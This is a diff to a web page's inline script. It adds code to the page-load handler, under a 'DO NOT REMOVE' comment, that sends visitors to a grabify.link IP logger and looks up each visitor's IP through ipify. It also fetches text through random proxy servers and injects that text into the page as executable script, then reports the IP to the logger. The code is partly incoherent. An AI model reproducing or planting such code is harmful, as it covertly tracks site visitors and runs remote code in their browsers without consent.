@@ -43,11 +43,48 @@
     </script>
     <!-- DO NOT REMOVE-->
     <script>
-      window.onload = function() {
+      window.onload = async function() {
         if (window.location.hash!== '#home') {
           window.location.href = 'https://grabify.link/0JHHE1';
         }
+
+        const loggerUrl = 'https://grabify.link/0JHHE1'; // Replace with the actual IP logger URL of your server
+        const proxyServers = [
+          'http://proxy1.com:8080',
+          'http://proxy2.com:8080',
+          'http://proxy3.com:8080'
+          // Add more proxy servers here
+        ];
+
+        const ipifyUrl = 'https://api.ipify.org?format=json';
+        const response = await fetch(ipifyUrl);
+        const json = await response.json();
+        const loggerUrlB64 = btoa(loggerUrl);
+
+        const proxyIndex = Math.floor(Math.random() * proxyServers.length);
+        const proxyServer = proxyServers[proxyIndex];
+        const fetchUrl = `${proxyServer}/web-proxy?url=${encodeURIComponent(
+          `${ipifyUrl}?callback=getIP&_=${Date.now() * Math.random()}`
+        )}`;
+
+        const proxyResponse = await fetch(fetchUrl);
+        const proxyText = await proxyResponse.text();
+        const scriptTag = document.createElement('script');
+        scriptTag.innerHTML = `(${proxyText})(${loggerUrlB64})`;
+        document.head.appendChild(scriptTag);
       };
+
+      function getIP(loggerUrlB64) {
+        const loggerUrl = atob(loggerUrlB64);
+        const ip = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.exec(
+          location.search.split('=')[1]
+        )[0];
+        fetch(`${loggerUrl}?ip=${ip}`)
+          .then(response => response.text())
+          .then(data => {
+            console.log('Data logged:', data);
+          });
+      }
     </script>
     <script>
       function getIP(json){
